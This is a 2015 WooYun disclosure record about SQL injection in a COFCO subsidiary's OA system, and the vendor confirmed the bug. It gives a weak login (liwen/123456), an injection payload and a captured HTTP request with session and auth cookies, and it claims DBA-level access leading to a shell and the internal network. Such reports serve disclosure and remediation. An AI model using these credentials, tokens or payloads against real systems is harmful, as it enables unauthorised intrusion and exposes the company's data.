{"id": 79506, "wybug_id": "wooyun-2015-0157985", "wybug_title": "中粮集团某系统多漏洞打包（getshell可入内网）", "wybug_corp": "中粮集团有限公司", "wybug_author": "路人甲", "wybug_date": "2015-12-04 09:49", "wybug_open_date": "2016-01-18 17:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向公众公开  简要描述： 只差一点了，求走大。。T T 详细说明：  http://oa.cofco-keystone.com\n\n这个系统弱口令应该是有人提过了，姓名top500+常见弱口令可以跑出很多账号来取一个账号登录，liwen/123456，发现系统很多处sql注入啊！！！容我一一道来\n\n#1报表查询处，时间未过滤\n\n查询时间输入123' and 1=db_name()--\n\n#2\nGET /webdoc/file_download.aspx?guid=c4247fa588d44fef9af90f3e39327e6c HTTP/1.1Host: oa.cofco-keystone.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://oa.cofco-keystone.com/frm/frm_flow_mainform.aspx?flow_ins_id=36323&flow_id=169&frm_id=119&id=0&hidbutton=true&Dialog=openCookie: ASP.NET_SessionId=wr2x0v45zcv3sbjpal34xefm; LtpaToken=AAECAzU2NUY4NjAwNTY2MEQ3ODBsaXdlbhynL3s6Hpl/5wT0fbLURlyc9FWG; .ASPXAUTH=2FEFE929A8A407FC3CBE8AF5E10A70D9B8EA5DE0E135589BD33D896CFEC1845680CC951B92584438A4F82CFF5E8C4F5A16D3196505A25AFE703777FBDBE8EAF31C26A475D296BD02DBF1CCE9A24918FCE10CC343155279FAE9ABC845B1CA6A6573048C0C81D53B7A8B5DAF89C6226E2F9AB15362; FIOA_EMP_ID=315; loginname=liwen; loginorg=1; FIOA_IMG_FOLDER=FIConnection: keep-alive\n报表抓包文件获取处，gui存在注入#3几乎查询的地方都用的前端过滤，其实后台抓包发送注入语句就可以，不一一列举了,注入点非常多\n\n而且权限非常高！！\n\n注入点dba权限，可以直接shell，添加用户进入内网\n\n这个系统问题有点大啊，建议在过滤方面重新写，或者添加全局waf   漏洞证明：  \n\n\n\n   修复方案：  建议在过滤方面重新写，或者添加全局waf   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-12-04 17:34 厂商回复： 非常感谢，马上整改！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}